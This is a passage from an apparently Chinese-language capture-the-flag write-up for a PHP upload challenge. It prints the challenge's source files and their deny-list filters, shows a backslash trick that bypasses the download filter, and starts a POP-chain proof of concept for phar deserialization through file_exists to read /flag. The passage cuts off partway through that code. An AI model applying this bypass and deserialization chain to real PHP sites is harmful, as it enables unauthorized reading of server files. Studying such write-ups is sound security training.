class="string">'%2527'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'*'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"'"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">';'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">"&#123;"</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'&#125;'</span>,<span class="string">'&amp;quot;'</span>,$string);</div><div class="line">    $string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</div><div class="line">    <span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>其中可以利用<code>$string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);</code>进行文件下载绕过，绕过方法如下：</strong></p><p><strong><code>/download.php?name=ind\\ex</code></strong><br><img src="http://pic.c1imber.top/blog/20191019/X6zYCWVL0ipY.png?imageslim" alt="mark"></p><p><strong>通过文件读取和文件下载结合获取源代码：</strong></p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'base.php'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>base.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">    session_start(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt; </div><div class="line">    &lt;title&gt;upload_or_not&lt;/title&gt; </div><div class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">    &lt;script src=<span class="string">"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt; </div><div class="line">        &lt;div class="container-fluid"&gt; </div><div class="line">        &lt;div class="navbar-header"&gt; </div><div class="line">            &lt;a class="navbar-brand" href="index.php"&gt;首页&lt;/a&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbra-toggle"&gt; </div><div class="line">                &lt;li class="active"&gt;&lt;a href="file.php?file="&gt;查看文件&lt;/a&gt;&lt;/li&gt; </div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"upload_file.php"</span>&gt;上传文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">                &lt;li&gt;&lt;a href=<span class="string">"download.php"</span>&gt;下载文件&lt;/a&gt;&lt;/li&gt;</div><div class="line">            &lt;/ul&gt; </div><div class="line">            &lt;ul class="nav navbar-nav navbar-right"&gt; </div><div class="line">                &lt;li&gt;&lt;a href="index.php"&gt;&lt;span class="glyphicon glyphicon-user"&gt;&lt;/span&gt;&lt;?php echo $_SERVER['REMOTE_ADDR'];?&gt;&lt;/a&gt;&lt;/li&gt; </div><div class="line">            &lt;/ul&gt; </div><div class="line">        &lt;/div&gt; </div><div class="line">    &lt;/nav&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt; </div><div class="line">&lt;!--flag is in /flag--&gt;</div></pre></td></tr></table></figure><p><strong>file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</div><div class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\/|\.\.|flag/i'</span>,$file)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>); </div><div class="line">&#125;<span class="keyword">elseif</span>(!preg_match(<span class="string">'/\//i'</span>,$file))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">&#125;</div><div class="line">$show = <span class="keyword">new</span> Show(); </div><div class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </div><div class="line">    $show-&gt;source = $file; </div><div class="line">    $show-&gt;_show(); </div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </div><div class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>function.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//show_source(__FILE__); </span></div><div class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </div><div class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>; </div><div class="line">    <span class="comment">//mkdir("upload",0777); </span></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </div><div class="line">        unlink($filename); </div><div class="line">    &#125; </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </div><div class="line">        upload_file_do(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </div><div class="line">    <span class="keyword">global</span> $_FILES; </div><div class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </div><div class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </div><div class="line">    $extension = end($temp); </div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </div><div class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> &#123; </div><div class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>upload_file.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </div><div class="line">upload_file(); </div><div class="line"><span class="meta">?&gt;</span> </div><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta charest=<span class="string">"utf-8"</span>&gt; </div><div class="line">&lt;title&gt;文件上传&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;div align = <span class="string">"center"</span>&gt; </div><div class="line">        &lt;h1&gt;上传的文件保存在/upload/md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]).<span class="string">".jpg"</span>&lt;/h1&gt; </div><div class="line">&lt;/div&gt; </div><div class="line">&lt;style&gt; </div><div class="line">    p&#123; margin:<span class="number">0</span> auto&#125; </div><div class="line">&lt;/style&gt; </div><div class="line">&lt;div&gt; </div><div class="line">&lt;form action=<span class="string">"upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt; </div><div class="line">    &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名:&lt;/label&gt; </div><div class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt; </div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt; </div><div class="line">&lt;/div&gt;     </div><div class="line"></div><div class="line"></div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;pre&gt;    </div><div class="line"></div><div class="line">$name = $_GET[<span class="string">'name'</span>];</div><div class="line">$url = $_SERVER[<span class="string">'QUERY_STRING'</span>];</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name))&#123;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\.|etc|var|tmp|usr/i'</span>, $url))&#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">"hacker!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">            <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            $name = safe_replace($name);</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/base|class|file|function|index|upload_file/i'</span>, $name))&#123;</div><div class="line">                $filename = $name.<span class="string">'.php'</span>;</div><div class="line">                $dir =<span class="string">"./"</span>;</div><div class="line">                $down_host = $_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/'</span>;</div><div class="line">                <span class="keyword">if</span>(file_exists(<span class="keyword">__DIR__</span>.<span class="string">'/'</span>.$dir.$filename))&#123;</div><div class="line">                    $file = fopen ( $dir.$filename, <span class="string">"rb"</span> );</div><div class="line">                    Header ( <span class="string">"Content-type: application/octet-stream"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Ranges: bytes"</span> );</div><div class="line">                    Header ( <span class="string">"Accept-Length: "</span> . filesize ( $dir.$filename ) );</div><div class="line">                    Header ( <span class="string">"Content-Disposition: attachment; filename="</span> . $filename );</div><div class="line">                    <span class="keyword">echo</span> fread ( $file, filesize ( $dir . $filename ) );</div><div class="line">                    fclose ( $file );</div><div class="line">                    <span class="keyword">exit</span> ();</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    <span class="keyword">echo</span> (<span class="string">"file doesn't exist."</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/flag/i'</span>, $name))&#123;</div><div class="line">                <span class="keyword">echo</span> (<span class="string">"hacker!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/html&gt;</div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;source = <span class="keyword">$this</span>-&gt;test;    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>代码审计后发现不能通过文件读取和文件下载直接获取flag，因为这里的过滤无法绕过</strong></p><p><strong>通过class.php代码猜测题目应该是考察的应该是php反序列化漏洞,但是并没有找到unserialize函数,不过发现file.php当中以下的代码可能存在phar反序列化漏洞的问题，php一些函数在使用phar伪协议解析phar文件时，会对phar文件当中的meta-data部分进行反序列化，其中<code>file_exists</code>函数就是其中之一</strong><br><img src="http://pic.c1imber.top/blog/20191019/Tbaro30aL4gW.png?imageslim" alt="mark"></p><p><strong>所以这道题的正确思路是应该是通过phar反序列化获取flag,思路如下：</strong></p><p><strong>构造pop链，生成phar文件，上传-&gt;通过文件读取，使用phar伪协议解析上传的phar文件-&gt;触发file_exists函数，产生php反序列化漏洞-&gt;通过php反序列化获取flag</strong></p><p><strong>构造pop链，生成phar文件：poc如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">'/flag'</span>;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">"_show"</span>=&gt;<span class="string">"file_get"</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    